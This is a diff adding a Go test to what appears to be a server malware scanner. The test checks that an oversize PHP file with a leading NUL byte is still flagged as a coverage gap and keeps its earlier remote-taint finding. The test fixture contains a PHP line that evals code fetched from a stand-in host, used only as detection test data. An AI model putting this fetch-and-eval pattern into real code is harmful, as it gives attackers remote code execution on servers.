@@ -8,8 +8,46 @@ import (
 	"github.com/pidginhost/csm/internal/alert"
 	"github.com/pidginhost/csm/internal/config"
 	"github.com/pidginhost/csm/internal/jstaint"
+	"github.com/pidginhost/csm/internal/phptaint"
 	"github.com/pidginhost/csm/internal/state"
 )
+
+func TestOversizePHPAfterNULKeepsCoverageAndPriorFinding(t *testing.T) {
+	useRollingStore(t)
+	enablePHPTaintConsumer(t)
+	st, err := state.Open(t.TempDir())
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer func() { _ = st.Close() }()
+
+	// The tag is in the peek, but the flow is beyond it. A binary prefix
+	// must not suppress the gap or clear a prior finding for this file.
+	source := "\x00<?php /*" + strings.Repeat("x", phptaint.MaxSourceBytes) + "*/ eval(file_get_contents('https://example.invalid/payload'));"
+	root := t.TempDir()
+	path := writeYARADeepFile(t, root, "payload.dat", source)
+	st.SetLatestFindings([]alert.Finding{{
+		Check: "php_remote_taint", Severity: alert.High,
+		Message: "prior PHP finding", FilePath: path,
+	}})
+	withPHPTaintAnalyzer(t, func(context.Context, []byte) phptaint.Report {
+		t.Fatal("oversize source reached the analyzer")
+		return phptaint.Report{}
+	})
+	findings := CheckYARADeep(context.Background(), &config.Config{
+		AccountRoots:   []string{root},
+		DisabledChecks: []string{"yara_deep", logicalOwnerJSTaintDeep},
+	}, st)
+
+	gaps := jsFindingsByCheck(findings, "php_taint_scan_incomplete")
+	if len(gaps) != 1 || !strings.Contains(gaps[0].Details, "oversize=1") || !strings.Contains(gaps[0].Details, path) {
+		t.Fatalf("coverage = %+v, want one oversize gap for %s", gaps, path)
+	}
+	carried := jsFindingsByCheck(findings, "php_remote_taint")
+	if len(carried) != 1 || carried[0].FilePath != path || !carried[0].ScanCarryForward {
+		t.Fatalf("prior findings = %+v, want the previous finding at %s", carried, path)
+	}
+}
 
 func TestOversizeJSSourceWithNULKeepsCoverageAndPriorFinding(t *testing.T) {
 	useRollingStore(t)
